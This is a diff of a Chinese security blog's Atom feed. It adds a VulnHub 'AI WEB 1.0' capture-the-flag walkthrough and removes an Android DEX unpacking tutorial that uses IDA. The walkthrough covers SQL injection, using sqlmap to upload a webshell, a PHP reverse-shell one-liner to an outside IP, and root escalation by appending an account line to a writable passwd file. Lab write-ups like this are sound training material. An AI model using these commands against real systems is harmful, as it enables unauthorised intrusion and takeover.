@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="/"/>
-  <updated>2019-11-06T04:41:49.864Z</updated>
+  <updated>2019-11-06T08:39:41.231Z</updated>
   <id>/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>VulnHub AI WEB 1.0</title>
+    <link href="/2019/11/AI-WEB%201.0/"/>
+    <id>/2019/11/AI-WEB 1.0/</id>
+    <published>2019-11-06T08:39:05.000Z</published>
+    <updated>2019-11-06T08:39:41.231Z</updated>
+    
+    <content type="html"><![CDATA[<p>加载虚拟机后，由于没有账号暂不登录，通过虚拟机网段，查询DHCP分配的地址。</p><p>扫描端口发现只有80的对外开放端口，访问发现</p><p><img src="/2019/11/AI-WEB 1.0/1572682029896.png" alt="1572682029896"></p><p>扫描路径发现robots文件。其中两个路径文件，看样子是文件上传的地址。</p><p><img src="/2019/11/AI-WEB 1.0/1572682020738.png" alt="1572682020738"></p><p>访问其中地址，403</p><p><img src="/2019/11/AI-WEB 1.0/1572682335561.png" alt="1572682335561"></p><p>介于是403尝试访问上一级发现</p><p><img src="/2019/11/AI-WEB 1.0/1572682385016.png" alt="1572682385016"></p><p>尝试输入1，发现显示admin用户，那就是说可能这是个注入点。</p><p><img src="/2019/11/AI-WEB 1.0/1572682438951.png" alt="1572682438951"></p><p>检查是否存在注入，发现存在</p><p><img src="/2019/11/AI-WEB 1.0/1572683771039.png" alt="1572683771039"></p><p>查询systemUser库发现三个用户</p><p><img src="/2019/11/AI-WEB 1.0/1572688569479.png" alt="1572688569479"></p><pre><code>t00r      | FakeUserPassw0rd                    aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sau3er      | N0tThis0neAls0</code></pre><p>扫描路径m3diNf0下的文件，发现如下地址。</p><pre><code>http://192.168.111.132/m3diNf0/info.php </code></pre><p>找到物理地址，利用sqlmap写shell</p><p><img src="/2019/11/AI-WEB 1.0/1572705709726.png" alt="1572705709726"></p><p>把给的路径加上物理地址都试一圈，发现如下地址是可写的。</p><pre><code>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</code></pre><p>利用sqlmap上传文件的小马来上传一句话，利用蚁剑连接</p><pre><code>http://192.168.111.132/se3reTdir777/uploads/a.php</code></pre><p>来到home目录下发现一个用户aiweb1。由于蚁剑的shell端是哑shell，反弹一个shell来提升。</p><pre><code>php -r &#39;$sock=fsockopen(&quot;10.102.45.228&quot;,8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p>获取shell后查看发现是较高版本的内核，理论上不是内核提权。</p><p><img src="/2019/11/AI-WEB 1.0/image-20191102234632541.png" alt="image-20191102234632541"></p><p>查看passwd文件，发现存在账号aiweb1pwn。利用之前获得的账号登陆</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103002714448.png" alt="image-20191103002714448"></p><p>但是这个账号下并没有发现有用的东西，利用suid位也没找到有用的信息。上传LinEnum.sh。来检查有用的信息。</p><p>后来在查看文件信息的时候发现passwd文件居然属于www-data用户权限。</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103012733428.png" alt="image-20191103012733428"></p><p>这么说我这个账号还是多余的用来。</p><p>利用perl来生成加密的密码，账号密码admin</p><pre><code>perl -le &#39;print crypt(&quot;admin&quot;,&quot;123&quot;)&#39;  //12wGaKkN1hGuwadmin:12wGaKkN1hGuw:0:0:User_like_root:/root:/bin/bash</code></pre><p>直接在蚁剑中追加一行</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103013158615.png" alt="image-20191103013158615"></p><p>sudo过来就已经是root权限</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103013307387.png" alt="image-20191103013307387"></p><p>找到flag</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103013329582.png" alt="image-20191103013329582"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;加载虚拟机后，由于没有账号暂不登录，通过虚拟机网段，查询DHCP分配的地址。&lt;/p&gt;
+&lt;p&gt;扫描端口发现只有80的对外开放端口，访问发现&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/2019/11/AI-WEB 1.0/1572682029896.png&quot; alt=&quot;1572682
+      
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>GitHub-Monitor</title>
@@ -476,29 +501,6 @@ int fun1()
     
     
       <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>基于dvmDexFileOpenPartial的动态脱壳</title>
-    <link href="/2019/05/%E5%9F%BA%E4%BA%8EdvmDexFileOpenPartial%E7%9A%84%E5%8A%A8%E6%80%81%E8%84%B1%E5%A3%B3/"/>
-    <id>/2019/05/基于dvmDexFileOpenPartial的动态脱壳/</id>
-    <published>2019-05-15T06:25:33.000Z</published>
-    <updated>2019-07-26T09:55:41.915Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="1、dvmDexFileOpenPartial脱壳原理"><a href="#1、dvmDexFileOpenPartial脱壳原理" class="headerlink" title="1、dvmDexFileOpenPartial脱壳原理"></a>1、dvmDexFileOpenPartial脱壳原理</h3><p>基于libdvm.so下dvmDexFileOpenPartial的文件脱壳，当然如果是新版的加固方式一般不可行，因为会基本会重写dvmDexFileOpenPartial方法。如此，先了解一下libdvm.so的方法dvmDexFileOpenPartial是干什么的。</p><p>加密dex文件在软件运行时，必然会解密加载到内存中运行，而dvmDexFileOpenPartial方法的参数：</p><p>int dvmDexFileOpenPartial(const void* addr, int len, DvmDex** ppDvmDex)</p><p>第一个参数代表dex文件的基地址，第二个参数代表dex文件的长度，第三个参数代表出参，dex文件的类，方法等信息。</p><p>方法的源码解读：<a href="http://www.blogfshare.com/load-dex-source.html" target="_blank" rel="noopener">从源码看Dex Dump于dvmDexFileOpenPartial原理</a></p><p>断点脱壳原理分析:<a href="https://www.cnblogs.com/jiaoxiake/p/6813127.html" target="_blank" rel="noopener">dvmDexFileOpenPartial断点脱壳原理分析</a></p><p>示例APP：<a href="https://github.com/eternalsakura/ctf_pwn/tree/master/android%E9%80%86%E5%90%91" target="_blank" rel="noopener">jscrack</a></p><p>由于使用的Android 4.4.4的环境，加载模式为Dalvik虚拟机模式，libdvm.so则是此模式下的文件，当然在Android 5.0以上取消了Dalvik模式，自然也不存在libdvm.so文件。dalvik虚拟机会把dex文件优化为odex文件,dvmDexFileOpenPartial则用来解析内存中优化过的dex文件，此时dex已经加载进内存，所以就可以dump出来了。</p><h3 id="2、示例演示"><a href="#2、示例演示" class="headerlink" title="2、示例演示"></a>2、示例演示</h3><p>首先调试模式启动APP，</p><pre><code>adb forward tcp:23946 tcp:23946          #IDA端口转发adb shell am start -D -n 包名/activity名  #调试模式启动APP adb shell ps | grep 包名                  #获取APP的PIDadb forward tcp:8700 jdwp:pid            #进程端口转发</code></pre><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899006483.png" alt="1557899006483"></p><p>然后调整IDA的调试选项，如下：</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899051732.png" alt="1557899051732"></p><p>选择对应的进程后，页面跳转，选择modules下的libdvm.so中的dvmDexFileOpenPartial方法，如下：</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899178517.png" alt="1557899178517"></p><p>找到方法后，在其第一行下断点，如下情形。</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899194095.png" alt="1557899194095"></p><p>然后转发jdb。此处jdb不可过早转发，不然下一步运行不到指定地址，将会跳过调试模式进入软件内。</p><pre><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></pre><p>附加完成后可以看到CMD卡在回车处暂无回显，在IDA下运行F9到指定断点处自动下断。</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899222926.png" alt="1557899222926"></p><p>单步运行F8一次即可，可以看到寄存器窗口中R0,R1的地址值。</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899257190.png" alt="1557899257190"></p><p>在file选项中点击script command运行如下脚本。则可以在D盘下看到dump出来的dex文件。</p><pre><code>static main(void){auto fp, dex_addr, end_addr;fp = fopen(&quot;D:\\dump.dex&quot;, &quot;wb&quot;);end_addr = R0 + R1;for ( dex_addr=R0; dex_addr &lt; end_addr; dex_addr ++ )fputc(Byte(dex_addr), fp);}</code></pre><p>选择jadx打开dex文件，可以看到源码已dump成功。</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899587774.png" alt="1557899587774"></p><h3 id="3、系统差异"><a href="#3、系统差异" class="headerlink" title="3、系统差异"></a>3、系统差异</h3><p>此处使用Android 4.4.4，如果使用Android 5.0以上不存在lindvm.so，则需要在libart.so中对Openmemory函数下断，同样操作，保存R1,R2的值，R1代表基地址，R2代表长度。</p><p>脚本为</p><pre><code>static main(void){   auto fp, dex_addr, end_addr;   fp = fopen(&quot;D:\\dump.dex&quot;, &quot;wb&quot;);  end_addr = R1 + R2;   for ( dex_addr=R1; dex_addr &lt; end_addr; dex_addr ++ )       fputc(Byte(dex_addr), fp);}</code></pre><p>参考文章：</p><p><a href="https://www.52pojie.cn/thread-778654-1-1.html" target="_blank" rel="noopener">IDA动态调试脱壳步骤</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;1、dvmDexFileOpenPartial脱壳原理&quot;&gt;&lt;a href=&quot;#1、dvmDexFileOpenPartial脱壳原理&quot; class=&quot;headerlink&quot; title=&quot;1、dvmDexFileOpenPartial脱壳原理&quot;&gt;&lt;/a&gt;1、dvm
-      
-    
-    </summary>
-    
-    
-      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
     
   </entry>
   
